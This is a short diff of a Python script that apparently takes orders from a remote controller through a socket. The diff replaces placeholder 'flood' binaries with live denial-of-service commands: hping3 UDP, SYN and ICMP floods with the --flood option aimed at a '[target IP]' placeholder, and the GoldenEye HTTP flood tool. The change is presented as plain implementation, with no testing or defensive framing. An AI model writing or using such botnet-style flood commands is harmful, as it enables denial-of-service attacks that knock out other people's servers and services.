@@ -13,10 +13,10 @@ sock = None
 mode_binaries = {
     "normal_traffic": ("normal_traffic_binary", ["--mode", "normal"]),
     "high_traffic": ("high_traffic_binary", ["--mode", "high"]),
-    "udp_flood": ("flood_binary", ["--type", "udp"]),
-    "tcp_flood": ("flood_binary", ["--type", "tcp"]),
-    "http_flood": ("flood_binary", ["--type", "http"]),
-    "icmp_flood": ("flood_binary", ["--type", "icmp"])
+    "udp_flood": ("hping3", ["--udp", "[target IP]", "-p", "[target port]", "--flood"]),
+    "syn_flood": ("hping3", ["-S", "[target IP]", "-p", "[target port]", "--flood"]),
+    "http_flood": ("python3", ["goldeneye.py", "http://[target IP]"]),
+    "icmp_flood": ("hping3", ["-1", "[target IP]", "--flood"])
 }
 
 def connect_to_controller():
